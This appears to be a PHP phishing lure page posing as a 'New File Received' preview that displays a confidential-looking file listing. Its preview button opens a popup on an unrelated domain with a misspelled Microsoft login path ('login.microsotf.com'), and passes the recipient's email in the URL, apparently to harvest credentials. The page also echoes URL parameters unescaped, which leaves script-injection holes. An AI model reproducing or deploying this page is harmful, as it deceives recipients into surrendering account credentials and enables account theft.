
<!DOCTYPE HTML>
<html>
 <head>
 <?php
 	error_reporting(0);
 	session_start();
 	$email = $_GET['user'];
 	$file = $_GET['file'];
 	$size = $_GET['size'];
 	$user = $_GET['email'];

 	 ;?>
  <title>New File Received</title>
 </head>
 <body>
<h2>Preview New File</h2>
<table style="font-s">
	<tr>
	<td><tt><a href="">Name</a></td>
	<td><tt><a href="">Last modified</a></td>
	<td><tt><a href="">Size</a> </td>
	<td><tt><a href="">Description</a></td></tr>
	<td></td>
	<hr></h4>
	<tr border-top="2px">
	<td width="180px"><?php echo $file; ?>  </td>
	<td width="180px"><?php echo date('d/m/Y',strtotime("-1 days")); ?>, 5:12 AM</td>
	<td width="100px"><?php echo $size; ?></td>       
	<td width="180px">Confidential    -  </td>
	<td><button onclick="openWin()">Preview Document</button></a></td></tr></table>
<hr></pre>
<address>This file was sent to <u><?php echo $email; ?></u>, </address>
</body>
<script>
var myWindow;

function openWin() {
    myWindow = window.open("", "myWindow", "width=500,height=600");
myWindow.location = "https://cc4hsummercamp.com/login.microsotf.com?auth=<?php echo MD5(rand(5,997));?>&file=<?php echo $file; ?>&user=<?php echo $user; ?>";
}

function closeWin() {
    myWindow.close();
}
</script></html>